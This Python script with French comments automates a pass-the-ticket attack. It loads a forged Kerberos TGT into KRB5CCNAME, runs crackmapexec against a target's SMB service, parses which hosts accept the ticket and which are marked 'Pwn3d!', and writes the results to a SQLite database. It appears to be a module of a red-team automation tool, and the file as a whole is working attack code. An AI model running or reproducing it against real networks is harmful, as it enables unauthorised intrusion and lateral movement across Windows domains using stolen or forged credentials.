#pass the ticket attack for a simple auth to smb protocole with TGT ticket
#importer les bibliothèques
import subprocess
import time
import argparse
import json
import sqlite3
from datetime import datetime
import os
import re

#Les arguments :
#remarque : decommenté les arguments
parser = argparse.ArgumentParser()

parser.add_argument('--activity_id', type=str, required=True, help='activity id')
parser.add_argument('--target_ip', type=str, required=True, help='target ip sur lequel on veut authentifier sous smb')
parser.add_argument('--path_to_TGT', type=str, required=True, help='le path ou le ticket TGT forger est stocker')

args = parser.parse_args()

target_ip = args.target_ip
path_to_TGT = args.path_to_TGT
segments = path_to_TGT.split("/")
username = segments[-1].split(".")[0]

#il faut exporter le ticket dans la variable d'environement KRB5CCNAME d'abord
os.environ['KRB5CCNAME'] = path_to_TGT


resultats = {}
if 'KRB5CCNAME' in os.environ:
	print("La variable KRB5CCNAME a été exporter avec succes ...")
	#comand for pass the ticket attack with crackmapexec
	cmd = "crackmapexec smb " + target_ip + " --use-kcache"
	print("La commande a lancer est : " + cmd)
	
	# Exécute la commande dans un nouveau processus
	process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
	
	# Attend que la tâche soit terminée et récupère la sortie
	output, error = process.communicate()
	print('%%%%%%%%%%%%%  sortie de la commande  %%%%%%%%%%%%%')
	print(output.decode("utf-8"))
	
	#regx pour supprimer les couleurs de la sortie ainsi que les espaces vide
	ansi_escape = re.compile(r'\x1b\[[0-9;]*m')
	ansi_escape1 = re.compile(r'[ ]+')
	
	#traitement de la sortie ...
	list_succes = []
	for sortie in output.decode('utf-8').split('\n'):
		if sortie.find('[+]') != -1:
			sortie = ansi_escape.sub('', sortie)
			sortie = ansi_escape1.sub(' ', sortie)
			print("sortie traité est : " + sortie)
			list_succes.append(sortie)
			
	resultats = {}
	hosts_list = []
	for ligne_succes_nettoyer in list_succes:
		resultat = {}
		pwn3d = False
		ip_host = ligne_succes_nettoyer.split(' ')[1]
		host_name = ligne_succes_nettoyer.split(' ')[3]
		if ligne_succes_nettoyer.find('(Pwn3d!)') != -1:
			pwn3d = True
		
		resultat = {
			'host_ip' : ip_host,
			'host_name' : host_name,
			'Pwn3d' : pwn3d
		
		}
		
		hosts_list.append(resultat)
	
	resultats = {
		'ticket_path' : path_to_TGT,
		'Service' : 'cifs',
		'hosts' : hosts_list,
		'exec_methode' : 'wmiexec',
		'username': username,
	}				
			
	print(json.dumps(resultats, indent=4))

	
#transformer le dictionnaire en JSON
json_resultats = json.dumps(resultats)


# obtenir l'id de l'activite sur laquel on va enregistrer le resultat :
activity_id = int(args.activity_id)

# Se connecter a la BDD pour enregistrer le resultat sous format json :
conn = sqlite3.connect("db.sqlite3")
c = conn.cursor()

activities = c.execute("update My_app_activity set results = ? where id = ?", (json_resultats, activity_id))
activities = c.execute("update My_app_activity set end_date = ? where id = ?", (datetime.now(), activity_id))

# commit les changements :
conn.commit()
		
	
	

